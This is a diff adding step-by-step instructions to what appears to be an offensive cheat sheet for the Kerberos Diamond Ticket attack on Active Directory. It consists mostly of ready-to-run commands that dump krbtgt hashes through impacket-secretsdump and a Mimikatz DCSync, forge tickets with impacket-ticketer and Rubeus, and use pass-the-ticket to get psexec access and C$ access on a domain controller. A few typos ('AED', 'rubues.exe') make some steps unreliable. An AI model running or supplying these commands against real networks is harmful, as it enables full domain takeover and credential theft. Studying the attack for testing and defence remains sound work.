@@ -16,7 +16,57 @@
 
 #### 2) krbtgt AES key
 
+## Remotely on Linux
+
+### 1) Extract NTLM and AES KRBTGT hashes and Domain SID
+
+    impacket-secretsdump domain.local/USER:PASSWORD@DC_IP -just-dc-user krbtgt
+
+Then,
+
+    nxc ldap DC_IP -u USER -p PASSWORD --get-sid
+
+### 2) Generate forged TGS and PAC
+
+Forge a service ticket for USER1 with potentially elevated privileges and a valid signature, bypassing mechanisms such as PAC validation by the DC.
+
+    impacket-ticketer -request -domain 'domain.local' -user 'USER1' -password 'PASSWORD1' -nthash KRBTGT_NTLM_HASH -aesKey KRBTGT_AES_KEY -domain-sid 'DOMAIN_SID' IMPERSONATED_USER
+
+### 3) Pass-the-Ticket
+
+    export KRB5CCNAME=IMPERSONATED_USER.ccache; impacket-psexec domain.local/IMPERSONATED_USER@dc.domain.local -dc-ip DC_IP -target-ip DC_IP -k -no-pass
+
+## Locally on Windows
+
+### 1) Extract NTLM and AED KRBTGT hashes 
+
+Run Mimikatz
+
+    mimikatz # privilege::debug
+    
+Do a DCSync
+
+    mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt
+
+### 2) Do the Diamond Ticket attack
+
+    rubeus.exe diamond /krbkey:KRBTGT_AES_KEY /user:USER1 /password:PASSWORD1 /enctype:aes /domain:domain.local /dc:dc.domain.local /ticketuser:IMPERSONATED_USER /ptt /nowrap
+
+### 3) From TGT to TGS
+
+    rubues.exe asktgs /ticket PASTE_TICKET_FROM_PREVIOUS_COMMAND /service:cifs/dc.domain.local /ptt /nowrap
+
+### 4) Display all Kerberos tickets in the cache
+
+    klist
+
+### 5) Verify access
+
+    dir \\dc.domain.local\c$
+
 ## Steps:
+
+
 
 ### 1) Get user SID
 
